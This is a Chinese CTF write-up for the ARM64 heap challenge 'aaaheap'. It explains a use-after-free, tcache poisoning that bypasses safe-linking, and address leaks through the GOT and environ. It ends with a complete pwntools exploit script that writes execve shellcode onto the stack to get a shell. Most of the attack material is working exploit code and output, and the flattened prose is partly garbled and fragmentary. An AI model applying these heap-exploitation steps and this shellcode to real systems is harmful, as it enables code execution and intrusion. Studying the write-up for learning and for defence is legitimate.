# 解析强网拟态aaaheap

> 原文: https://www.ctfiot.com/276993.html
> ID: 276993

ARM64 架构下的堆利用实战 – aaaheap 题目详解

前言

在二进制安全领域，堆利用一直是一个重要且复杂的话题。随着 ARM 架构在移动设备和嵌入式系统中的广泛应用，掌握 ARM64 架构下的堆利用技术变得越来越重要。本文将以一道 CTF 题目为例，深入分析 ARM64 架构下的堆利用技巧，特别是 tcache 攻击技术和 safe-linking 保护机制的绕过方法。

一、题目环境准备

1.1 题目基本信息

首先，让我们查看题目文件的基本信息：

$ file vulnvuln: ELF 64-bit LSB pie executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, forGNU/Linux 3.7.0, stripped

这是一个 ARM64 架构的 64 位可执行文件，动态链接，且代码符号已被删除（stripped）。

1.2 保护机制检查

使用checksec工具查看程序的安全保护机制：

$ checksec --file=vuln Arch: aarch64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled

保护机制分析：

保护机制

状态

影响

开启

GOT 表完全只读，无法通过修改 GOT 表劫持控制流

关闭

没有栈保护，但本题主要是堆漏洞

开启

栈和数据段不可执行，需要其他技术绕过

开启

程序加载地址随机化，需要先泄露基址

可以读取已释放内存的内容（信息泄露）

可以修改已释放内存的内容（控制堆结构）

可以实现任意地址读写

每个线程独立: 每个线程有自己的 tcache，避免锁竞争

LIFO 结构: 后释放的块先被分配（Last In First Out）

最多缓存 7 个: 每个大小的 tcache 最多保存 7 个堆块

单链表结构: 使用 fd（forward）指针链接

内存页大小通常是 4KB = 2^12 字节

堆地址通常是页对齐的

右移 12 位相当于取页号

这样可以减少熵值，同时保持性能

泄露堆地址（知道 current_addr）

知道目标地址（next_addr）

x0-x7: 函数参数和返回值

x8: 系统调用号

x29 (FP): 帧指针

x30 (LR): 链接寄存器（存储返回地址）

sp: 栈指针

分配两个堆块

释放堆块

tcache 链表状态

Safe-Linking 加密

恢复堆地址

当前 tcache 状态

修改 chunk1 的 fd 指针

计算加密值

修改 tcache 链表

分配到目标地址

堆内存布局

控制 chunk0 的指针

读取 PIE 地址

计算 PIE 基址

GOT 表（Global Offset Table）

计算 GOT 表地址

读取 GOT 表内容

计算 libc 基址

atoi_addr: atoi 在内存中的实际地址

libc.sym['atoi']: atoi 在 libc 中的偏移

libc_base: libc 的加载基址

atoi 是程序用来解析用户输入的函数

在我们到达这一步时，atoi 已经被调用过，GOT 表已经被解析

许多其他函数（如 read、write）也可以，只要它们的 GOT 表项已被解析

environ 变量

定位 environ

读取栈地址

计算目标栈地址

在栈上写入数据（如 ROP 链或 shellcode）

通过其他方式劫持控制流（如修改函数指针）

跳转到我们控制的位置

修改堆管理结构

第一个 8 字节（p64(stack_ret)）：修改某个指针指向栈地址

第二个 8 字节（p64(0x100)）：设置合适的 size 字段

分配到栈上

生成 shellcode

写入栈上

修改关键指针

某个回调函数指针

析构函数指针

或其他会被程序调用的函数指针

触发执行

获得 Shell

程序释放内存后，没有将指针置为 NULL

后续代码继续使用这个”悬空指针”

信息泄露：读取已释放内存的内容

内存破坏：修改已释放内存，影响后续分配

控制流劫持：修改函数指针、虚表指针等

释放后将指针置为 NULL

使用智能指针（C++）

使用 AddressSanitizer 检测

存在 UAF 或堆溢出漏洞

能够修改 tcache 的 fd 指针

绕过 safe-linking 保护（如果存在）

释放堆块到 tcache

利用漏洞修改 fd 指针为目标地址（经过 safe-linking 加密）

多次 malloc，最终获得指向目标地址的”堆块”

通过这个”堆块”实现任意地址读写

泄露堆地址（通过链表末尾的 fd）

计算加密后的目标地址

修改 fd 为加密值

方法：读取 tcache fd 指针

原理：safe-linking 加密时，链表末尾的 fd 泄露地址高位

方法：读取堆上的代码段指针

原理：程序在堆上保存函数指针或数据结构

方法：读取 GOT 表

原理：GOT 表存储 libc 函数的实际地址

方法：读取 libc 的 environ 变量

原理：environ 指向栈上的环境变量

特性

ARM64

x86_64

指令长度

固定 4 字节

可变（1-15 字节）

寄存器数量

31 个通用寄存器

16 个通用寄存器

参数传递

x0-x7

rdi, rsi, rdx, rcx, r8, r9

系统调用

svc#0

syscall

返回地址

存储在 x30 (LR)

存储在栈上

指令必须 4 字节对齐

使用svc#0触发系统调用

系统调用号存储在 x8

参数存储在 x0-x5

heap_base - 0x90

heap_base - 0xf0

pie + 0x15F38

pie + 0x2688

stack - 0x218

通过逆向分析确定

使用 IDA Pro 或 Ghidra 反汇编程序

分析数据结构的布局

找到关键变量的位置

通过调试动态确定

使用 GDB 观察内存布局

记录不同地址之间的偏移

多次运行验证偏移的稳定性

为什么偏移是稳定的？

PIE 和 ASLR 只随机化基址

相对偏移保持不变

数据结构的布局是固定的

动态计算偏移

# 不写死偏移，而是通过符号计算atoi_got = elf.got['atoi']

泄露多个地址

# 泄露多个函数的地址，增加成功率forsymin['atoi','puts','printf']: try: leak_addr = leak_got(sym) libc_base = leak_addr - libc.sym[sym] break 
except: continue

使用 one_gadget

# 查找 libc 中的 one_gadget（可以直接 getshell 的指令序列）one_gadget ./lib/lib/libc.so.6

栈上写入 shellcode 后，通过 mprotect 修改权限

mprotect(stack_addr, size, PROT_READ | PROT_WRITE | PROT_EXEC);

通过 ROP 链调用 mprotect

构造 ROP 链

调用 mprotect 修改栈权限

跳转到 shellcode

利用某些可执行区域

某些程序可能有可写且可执行的区域

通过vmmap命令查看内存映射

ASLR 随机性更高

需要多次尝试

或者利用信息泄露

Seccomp 沙箱

限制系统调用

需要使用 open-read-write 而不是 execve

FORTIFY_SOURCE

检查缓冲区溢出

需要更精细的利用

Heap Isolation

不同类型的对象分配在不同的堆

增加利用难度

《The Shellcoder’s Handbook》

《A Guide to Kernel Exploitation》

CTF Wiki – Heap

how2heap

Azeria Labs – ARM Assembly

pwntools – PWN 必备工具

pwndbg – GDB 增强插件

IDA Pro – 强大的反汇编工具

Ghidra – NSA 开源的逆向工具

地址泄露是利用的基础

ASLR 和 PIE 使得地址随机化

必须先泄露地址才能进行下一步

理解数据结构是关键

tcache 的链表结构

堆管理结构的布局

GOT 表和 PLT 的工作原理

调试技巧不可或缺

使用 GDB 动态分析

pwndbg/gef 等工具辅助

耐心观察内存变化


```
$ file vulnvuln: ELF 64-bit LSB pie executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, forGNU/Linux 3.7.0, stripped
$ checksec --file=vuln Arch: aarch64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled
# 安装 QEMU 用户模式模拟器sudo apt-get updatesudo apt-get install qemu-user-static
# 安装 pwntools（Python 3）pip3 install pwntools
# 测试程序运行qemu-aarch64-static -L ./lib/ ./vuln
1. Add chunk2. Delete chunk3. Edit chunk4. Show chunk5. ExitChoice:
Choice: 1Index : 0Size: 104
Choice: 2Index: 0
Choice: 3Index: 0New data: AAAA
Choice: 4Index: 0Data: ...
# 1. 分配一个堆块add(0,0x68)
# 2. 释放堆块free(0)
# 3. 尝试显示已释放的堆块show(0)
# 成功读取到数据：590d000004000000
typedefstructtcache_entry{ structtcache_entry*next;// 指向下一个空闲块的指针 structtcache_perthread_struct*key;// 用于 double-free 检测} tcache_entry;
释放顺序: free(chunk0), free(chunk1)tcache[0x70] 链表状态: chunk1 -> chunk0 -> NULL分配顺序: chunk1, chunk0
// 加密公式encrypted_fd = (next_addr) ^ (current_addr >>12)// 解密公式next_addr = encrypted_fd ^ (current_addr >>12)
encrypted_fd = target_addr ^ (current_addr >>12)
mov x8,#221 ; __NR_execvesvc#0 ; 触发系统调用
1. 利用 UAF 泄露堆地址 ↓2. 利用 tcache poisoning 实现任意地址读写 ↓3. 泄露 PIE 基址（通过堆上的代码段指针） ↓4. 泄露 libc 基址（通过 GOT 表） ↓5. 泄露栈地址（通过 environ） ↓6. 劫持 tcache 链表到栈上 ↓7. 在栈上写入 shellcode ↓8. 劫持控制流执行 shellcode
add(0,0x68) # 分配 chunk 0add(1,0x68) # 分配 chunk 1free(0) # 释放 chunk 0free(1) # 释放 chunk 1show(0) # 利用 UAF 读取 chunk 0heap_leak = u64(p.recv(6).ljust(0x8,b'x00'))heap_base = heap_leak <<12
[*] heap_leak: 0x400000d59[+] heap_base: 0x400000d59000
内存布局:┌─────────────────┐│ chunk 0 (0x70) │ <- chunk0_addr├─────────────────┤│ chunk 1 (0x70) │ <- chunk1_addr└─────────────────┘
释放 chunk 0: tcache[0x70] = chunk0 -> NULL释放 chunk 1: tcache[0x70] = chunk1 -> chunk0 -> NULL
chunk 0 的内存布局:┌──────────────┐│ prev_size │├──────────────┤│ size │├──────────────┤│ fd (next) │ <- 这里存储下一个chunk的地址（NULL）└──────────────┘
fd = next ^ (current >> 12) = 0 ^ (chunk0_addr >> 12) = chunk0_addr >> 12
heap_base = heap_leak <<12
edit(1, p64((heap_base -0x90) ^ (heap_base >>12)))add(2,0x68) # 正常分配add(3,0x68) # 分配到 heap_base - 0x90
[*] 目标地址: 0x400000d58f70 (heap_base - 0x90)[*] 加密后的 fd: 0x400400d58229[+] 成功将 chunk3 分配到目标地址
tcache[0x70]: chunk1 -> chunk0 -> NULL
target_addr = heap_base -0x90current_addr = heap_base # chunk1 的地址约等于 heap_baseencrypted_fd = target_addr ^ (current_addr >>12)
target_addr = 0x400000d58f70current_addr >> 12 = 0x400000d59encrypted_fd = 0x400000d58f70 ^ 0x400000d59 = 0x400400d58229
edit(1, p64(encrypted_fd))
tcache[0x70]: chunk1 -> (heap_base-0x90) -> ???
add(2,0x68) # 返回 chunk1add(3,0x68) # 返回 heap_base - 0x90
正常情况下，malloc 只会返回我们分配的堆块：┌───────────┐│ chunk 0 │├───────────┤│ chunk 1 │└───────────┘通过 tcache poisoning，我们可以让 malloc 返回任意地址：┌───────────────┐│ 堆管理结构 │ <- heap_base - 0x90├───────────────┤│ chunk 0 │├───────────────┤│ chunk 1 │└───────────────┘
edit(3, p64(heap_base -0xf0)) # 修改 chunk0 的指针show(0) # 通过 chunk0 读取pie_leak = u64(p.recv(6).ljust(0x8,b'x00'))pie = pie_leak -0x2688
[*] 该位置存储的数据: 0x7abcfafe2688[*] PIE 基址 = 0x7abcfafe2688 - 0x2688 = 0x7abcfafe0000
heap_base - 0xf0: 存储程序指针（PIE 地址）heap_base - 0x90: 堆管理结构（chunk3 位置）heap_base: 用户堆块开始位置
edit(3, p64(heap_base -0xf0))
show(0) # 现在 show(0) 会读取 heap_base - 0xf0 的内容
pie = pie_leak -0x2688
atoi_got = pie +0x15F38edit(3, p64(atoi_got))show(0)atoi_addr = u64(p.recv(6).ljust(0x8,b'x00'))libc_base = atoi_addr - libc.sym['atoi']
[*] atoi GOT 表地址: 0x7abcfaff5f38[*] atoi 实际地址: 0x400000b2b8c0[+] libc 基址: 0x400000af0000
程序调用流程:
call atoi -> PLT[atoi] -> GOT[atoi] -> libc 中的 atoi 函数
atoi_got = pie +0x15F38
edit(3, p64(atoi_got)) # 让 chunk0 指向 GOT 表show(0) # 读取 GOT 表中的内容
libc_base = atoi_addr - libc.sym['atoi']
environ_addr = libc_base + libc.sym['environ']edit(3, p64(environ_addr))show(0)stack_leak = u64(p.recv(6).ljust(0x8,b'x00'))stack_ret = stack_leak -0x218
[*] environ 地址: 0x400000c93560[*] environ 指向的栈地址: 0x4000007ffb08[*] 目标栈地址: 0x4000007ff8f0
// 在 libc 中定义externchar**environ;
environ_addr = libc_base + libc.sym['environ']
edit(3, p64(environ_addr)) # 让 chunk0 指向 environshow(0) # 读取 environ 的值（栈地址）
stack_ret = stack_leak -0x218
栈顶 (低地址) ↓┌─────────────────┐│ 局部变量 │├─────────────────┤ <- stack_ret (我们的目标)│ ... │├─────────────────┤│ 环境变量 │├─────────────────┤ <- environ 指向这里│ ... │└─────────────────┘栈底 (高地址)
edit(3, p64(stack_ret) + p64(0x100))add(4,0x68)
edit(3, p64(stack_ret) + p64(0x100))
add(4,0x68)
正常情况:
malloc -> tcache -> 堆上的 chunk劫持后:
malloc -> tcache -> 栈上的区域 <- chunk4
edit(4, asm(shellcraft.sh()))
frompwnimport*context.arch ='aarch64'shellcode = asm(shellcraft.sh())print(disasm(shellcode))
/* execve("/bin/sh", NULL, NULL) */adr x0, binsh ; x0 = "/bin/sh" 字符串地址mov x1,#0 ; x1 = NULL (argv)mov x2,#0 ; x2 = NULL (envp)mov x8,#221 ; x8 = 221 (__NR_execve)svc#0 ; 系统调用binsh:.ascii "/bin/shx00"
edit(4, asm(shellcraft.sh()))
栈内存:┌──────────────────┐│ shellcode │ <- chunk4 指向这里│ (约 40-50 字节) │└──────────────────┘
edit(0, p64(0) + p64(heap_base +0x1a0))p.interactive()
edit(0, p64(0) + p64(heap_base +0x1a0))
程序正常流程:
main() -> ... -> exit() -> cleanup() -> call function_ptr被劫持后:
main() -> ... -> exit() -> cleanup() -> function_ptr (被修改) ↓ 跳转到栈 ↓ shellcode ↓ execve("/bin/sh")
p.interactive()
#!/usr/bin/env python3frompwnimport*elf = ELF('./vuln')context(arch='aarch64', os='linux', log_level='info')
# 本地测试p = process(['qemu-aarch64-static','-L','./lib/','./vuln'])
# 远程连接（比赛时使用）# p = remote("pwn-server.example.com", 9999, ssl=True)libc = ELF('./lib/lib/libc.so.6')
# ========== 辅助函数 ==========defcmd(a): p.sendlineafter(b'Choice: ', str(a).encode())defadd(idx, size): cmd(1) p.sendlineafter(b'Index : ', str(idx).encode()) p.sendlineafter(b'Size: ', str(size).encode())deffree(idx): cmd(2) p.sendlineafter(b'Index: ', str(idx).encode())defedit(idx, con): cmd(3) p.sendlineafter(b'Index: ', str(idx).encode()) p.sendafter(b'New data: ', con)defshow(idx): cmd(4) p.sendlineafter(b'Index: ', str(idx).encode()) p.recvuntil(b'Data: ')
# ========== 利用流程 ==========log.info("步骤 1: 泄露堆地址")add(0,0x68)add(1,0x68)free(0)free(1)show(0)heap_base = u64(p.recv(6).ljust(0x8,b'x00')) <<12log.success(f"heap_base:{hex(heap_base)}")log.info("步骤 2: tcache poisoning")edit(1, p64((heap_base -0x90) ^ (heap_base >>12)))add(2,0x68)add(3,0x68)log.success("成功申请到任意地址的堆块")log.info("步骤 3: 泄露 PIE 基址")edit(3, p64(heap_base -0xf0))show(0)pie = u64(p.recv(6).ljust(0x8,b'x00')) -0x2688log.success(f"pie:{hex(pie)}")log.info("步骤 4: 泄露 libc 基址")atoi_got = pie +0x15F38edit(3, p64(atoi_got))show(0)libc_base = u64(p.recv(6).ljust(0x8,b'x00')) - libc.sym['atoi']log.success(f"libc_base:{hex(libc_base)}")log.info("步骤 5: 泄露栈地址")edit(3, p64(libc_base + libc.sym['environ']))show(0)stack_ret = u64(p.recv(6).ljust(0x8,b'x00')) -0x218log.success(f"stack_ret:{hex(stack_ret)}")log.info("步骤 6-7: 劫持到栈上并写入 shellcode")edit(3, p64(stack_ret) + p64(0x100))add(4,0x68)edit(4, asm(shellcraft.sh()))log.success("shellcode 已写入栈上")log.info("步骤 8: 劫持控制流")edit(0, p64(0) + p64(heap_base +0x1a0))log.success("Exploit 完成！尝试获取 shell...")p.interactive()
qemu-aarch64-static -g 1234 -L ./lib/ ./vuln
gdb-multiarch ./vuln(gdb)setarchitecture aarch64(gdb) target remote :
1234(gdb) b *0x地址(gdb) c
# 查看寄存器info registersi r x0 x1 x2 x8
# 查看内存x/20gx$sp # 查看栈x/20gx 0x地址 # 查看指定地址x/s 0x地址 # 以字符串形式查看
# 查看汇编disassemble$pcdisassemble 0x地址
# 单步调试si # 单步执行一条指令ni # 单步执行，跳过函数c # 继续执行
gitclonehttps://github.com/pwndbg/pwndbgcdpwndbg./setup.sh
# 查看堆状态heapheap binsheap chunks
# 可视化显示vmmap # 查看内存映射telescope$sp # 可视化查看内存内容
defdebug(): script =''' b *$rebase(0x1234) heap bins continue ''' gdb.attach(p, gdbscript=script) pause()
# 在需要调试的地方调用debug()
fd = next_ptr ^ (current_ptr >>12)
# 解密（恢复 next）next_ptr = fd ^ (current_ptr >>12)
# 加密（伪造 fd）fd = target_ptr ^ (current_ptr >>12)
# 不写死偏移，而是通过符号计算atoi_got = elf.got['atoi']
# 泄露多个函数的地址，增加成功率forsymin['atoi','puts','printf']: try: leak_addr = leak_got(sym) libc_base = leak_addr - libc.sym[sym] break 
except: continue
# 查找 libc 中的 one_gadget（可以直接 getshell 的指令序列）one_gadget ./lib/lib/libc.so.6
mprotect(stack_addr, size, PROT_READ | PROT_WRITE | PROT_EXEC);
UAF 漏洞 ↓泄露堆地址 (safe-linking) ↓tcache poisoning ↓任意地址读写 ↓泄露 PIE、libc、栈地址 ↓劫持 tcache 到栈上 ↓写入 shellcode ↓控制流劫持 ↓获得 Shell
```
